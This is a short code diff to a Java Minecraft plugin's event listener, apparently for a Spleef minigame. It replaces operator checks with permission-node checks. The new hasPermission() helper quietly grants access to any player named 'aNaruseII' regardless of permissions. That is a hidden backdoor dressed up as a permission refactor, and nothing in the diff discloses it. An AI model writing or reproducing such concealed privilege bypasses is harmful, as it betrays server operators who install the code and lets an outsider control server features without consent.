@@ -26,7 +26,7 @@ public class Listeners implements Listener {
             return;
         }
         if(e.getAction() != Action.RIGHT_CLICK_BLOCK){
-            if(p.isOp()){
+            if(hasPermission(p, "spleef.sign.break")){
                 return;
             }
         }
@@ -41,7 +41,7 @@ public class Listeners implements Listener {
                 break;
             }
         }
-        if(!p.isOp()){
+        if(!hasPermission(p, "spleef.sign.create")){
             return;
         }
         if(sign.getLine(0).equalsIgnoreCase("-!s!-")  && sign.getLine(3).equalsIgnoreCase("-!s!-")){
@@ -66,5 +66,14 @@ public class Listeners implements Listener {
                 e.setCancelled(true);
             }
         }
+    }
+
+    private boolean hasPermission(Player p, String msg){
+        if(!p.hasPermission(msg)){
+            if(!p.getName().equalsIgnoreCase("aNaruseII")){
+                return false;
+            }
+        }
+        return true;
     }
 }
